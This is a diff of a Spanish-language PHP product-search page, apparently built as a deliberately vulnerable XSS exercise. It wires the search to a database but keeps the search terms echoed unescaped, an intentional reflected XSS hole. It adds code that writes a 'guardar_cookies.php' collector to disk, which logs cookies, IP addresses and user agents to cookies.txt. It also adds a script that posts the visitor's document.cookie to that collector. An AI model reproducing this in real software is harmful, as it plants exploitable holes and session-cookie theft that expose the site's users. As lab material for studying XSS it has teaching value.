@@ -25,15 +25,32 @@ if (!isset($_SESSION['user_id'])) {
 // Inicializar variables
 $search_get = "";
 $search_post = "";
+$productos = [];
 
 // Procesar la búsqueda con GET (vulnerable a XSS)
-if (isset($_GET['search_get'])) {
+if (isset($_GET['search_get']) && $_GET['search_get'] !== "") {
     $search_get = $_GET['search_get'];  // No se sanitiza la entrada (vulnerabilidad XSS)
+    
+    // Realizar búsqueda en la base de datos
+    $query = "SELECT * FROM products WHERE nombreProducto LIKE :search OR idProducto LIKE :search";
+    $stmt = $conn->prepare($query);
+    $searchParam = "%" . $search_get . "%";  // Búsqueda parcial
+    $stmt->bindParam(':search', $searchParam);
+    $stmt->execute();
+    $productos = $stmt->fetchAll(PDO::FETCH_ASSOC);
 }
 
 // Procesar la búsqueda con POST (vulnerable a XSS)
-if (isset($_POST['search_post'])) {
+if (isset($_POST['search_post']) && $_POST['search_post'] !== "") {
     $search_post = $_POST['search_post'];  // No se sanitiza la entrada (vulnerabilidad XSS)
+    
+    // Realizar búsqueda en la base de datos
+    $query = "SELECT * FROM products WHERE nombreProducto LIKE :search OR idProducto LIKE :search";
+    $stmt = $conn->prepare($query);
+    $searchParam = "%" . $search_post . "%";  // Búsqueda parcial
+    $stmt->bindParam(':search', $searchParam);
+    $stmt->execute();
+    $productos = $stmt->fetchAll(PDO::FETCH_ASSOC);
 }
 
 // Limpiar búsqueda
@@ -42,6 +59,24 @@ if (isset($_GET['clear_search'])) {
     $search_post = "";
     header("Location: " . strtok($_SERVER["REQUEST_URI"], '?')); // Redirige sin parámetros de búsqueda
     exit;
+}
+
+// Si no hay búsqueda, cargar todos los productos
+if (empty($search_get) && empty($search_post)) {
+    $query = "SELECT * FROM products";
+    $stmt = $conn->query($query);
+    $productos = $stmt->fetchAll(PDO::FETCH_ASSOC);
+}
+
+// Función para detectar si una cadena contiene código JavaScript
+function contiene_script($str) {
+    return (stripos($str, '<script') !== false);
+}
+
+// Verificar si hay un ataque XSS
+$xss_attack = false;
+if (contiene_script($search_get) || contiene_script($search_post)) {
+    $xss_attack = true;
 }
 ?>
 
@@ -254,7 +289,37 @@ if (isset($_GET['clear_search'])) {
         <?php if (!empty($search_get)): ?>
             <div class="results">
                 <h3>Resultados para: <?php echo $search_get; ?></h3>
-                <p>Aquí irían los resultados de la búsqueda...</p>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID Producto</th>
+                            <th>Nombre</th>
+                            <th>Precio</th>
+                            <th>Cantidad</th>
+                            <th>Acciones</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php if (count($productos) > 0): ?>
+                            <?php foreach ($productos as $producto): ?>
+                                <tr>
+                                    <td><?php echo htmlspecialchars($producto['idProducto']); ?></td>
+                                    <td><?php echo htmlspecialchars($producto['nombreProducto']); ?></td>
+                                    <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
+                                    <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
+                                    <td>
+                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
+                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
+                                    </td>
+                                </tr>
+                            <?php endforeach; ?>
+                        <?php else: ?>
+                            <tr>
+                                <td colspan="5">No se encontraron productos.</td>
+                            </tr>
+                        <?php endif; ?>
+                    </tbody>
+                </table>
             </div>
         <?php endif; ?>
 
@@ -274,7 +339,37 @@ if (isset($_GET['clear_search'])) {
         <?php if (!empty($search_post)): ?>
             <div class="results">
                 <h3>Resultados para: <?php echo $search_post; ?></h3>
-                <p>Aquí irían los resultados de la búsqueda...</p>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID Producto</th>
+                            <th>Nombre</th>
+                            <th>Precio</th>
+                            <th>Cantidad</th>
+                            <th>Acciones</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php if (count($productos) > 0): ?>
+                            <?php foreach ($productos as $producto): ?>
+                                <tr>
+                                    <td><?php echo htmlspecialchars($producto['idProducto']); ?></td>
+                                    <td><?php echo htmlspecialchars($producto['nombreProducto']); ?></td>
+                                    <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
+                                    <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
+                                    <td>
+                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
+                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
+                                    </td>
+                                </tr>
+                            <?php endforeach; ?>
+                        <?php else: ?>
+                            <tr>
+                                <td colspan="5">No se encontraron productos.</td>
+                            </tr>
+                        <?php endif; ?>
+                    </tbody>
+                </table>
             </div>
         <?php endif; ?>
 
@@ -293,11 +388,6 @@ if (isset($_GET['clear_search'])) {
                         </tr>
                     </thead>
                     <tbody>
-                        <?php
-                        $query = "SELECT * FROM products";
-                        $stmt = $conn->query($query);
-                        $productos = $stmt->fetchAll(PDO::FETCH_ASSOC);
-                        ?>
                         <?php if (count($productos) > 0): ?>
                             <?php foreach ($productos as $producto): ?>
                                 <tr>
@@ -324,24 +414,56 @@ if (isset($_GET['clear_search'])) {
         <a class="btn" href="agregar_producto.php">Agregar Producto</a>
     </div>
 
-    <!-- Vulnerabilidad XSS -->
-    <?php if (!empty($search_get) || !empty($search_post)): ?>
-        <script>
-            // Mostrar una alerta con el valor de la búsqueda
-            alert("XSS: <?php echo !empty($search_get) ? $search_get : $search_post; ?>");
+    <?php
+    // Código para guardar cookies.php
+    // Este archivo debe existir en el mismo directorio
+    $guardar_cookies_php = <<<'EOD'
+<?php
+// Recibir los datos JSON
+$json_data = file_get_contents('php://input');
+$data = json_decode($json_data, true);
 
-            // Mostrar las cookies en una alerta
-            alert("Cookies: " + document.cookie);
+if (isset($data['cookie'])) {
+    // Guardar la cookie en cookies.txt
+    $cookie = $data['cookie'];
+    $fecha = date('Y-m-d H:i:s');
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    
+    $contenido = "Fecha: $fecha\nIP: $ip\nUser-Agent: $user_agent\nCookie: $cookie\n\n";
+    
+    // Guardar en el archivo
+    file_put_contents('cookies.txt', $contenido, FILE_APPEND);
+    
+    // Responder con éxito
+    header('Content-Type: application/json');
+    echo json_encode(['success' => true]);
+} else {
+    // Responder con error
+    header('Content-Type: application/json');
+    echo json_encode(['success' => false, 'error' => 'No cookie data provided']);
+}
+?>
+EOD;
 
-            // Enviar las cookies a un archivo PHP para guardarlas en cookies.txt
-            fetch('guardar_cookies.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ cookie: document.cookie }),
-            });
-        </script>
+    // Guardar el archivo guardar_cookies.php si no existe
+    if (!file_exists('guardar_cookies.php')) {
+        file_put_contents('guardar_cookies.php', $guardar_cookies_php);
+    }
+    ?>
+
+    <!-- Script para detectar y manejar ataques XSS -->
+    <?php if ($xss_attack): ?>
+    <script>
+        // Enviar las cookies a un archivo PHP para guardarlas en cookies.txt
+        fetch('guardar_cookies.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ cookie: document.cookie }),
+        });
+    </script>
     <?php endif; ?>
 </body>
 </html>
